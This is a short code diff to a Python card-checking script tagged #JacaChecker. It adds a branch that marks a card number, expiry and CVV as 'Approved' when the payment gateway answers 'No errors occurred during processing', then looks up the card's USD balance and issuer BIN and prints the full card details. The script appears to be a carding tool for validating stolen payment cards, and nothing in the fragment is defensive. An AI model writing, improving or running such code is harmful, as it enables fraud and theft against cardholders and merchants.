@@ -361,6 +361,14 @@ def checker(card, month, year, cvv):
                 #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                 print(Fore.GREEN + f"{x} #JacaChecker") 
                 return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
+
+            elif 'No errors occurred during processing' in response.text:
+                dolar = saldo(card, month, year, cvv)
+                bin = api_bin(card[:6])              
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Approved  [ USD: {dolar} ]"                    
+                #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
+                print(Fore.GREEN + f"{x} #JacaChecker") 
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                     
             elif 'expired' in response.text:  
                 bin = api_bin(card[:6])
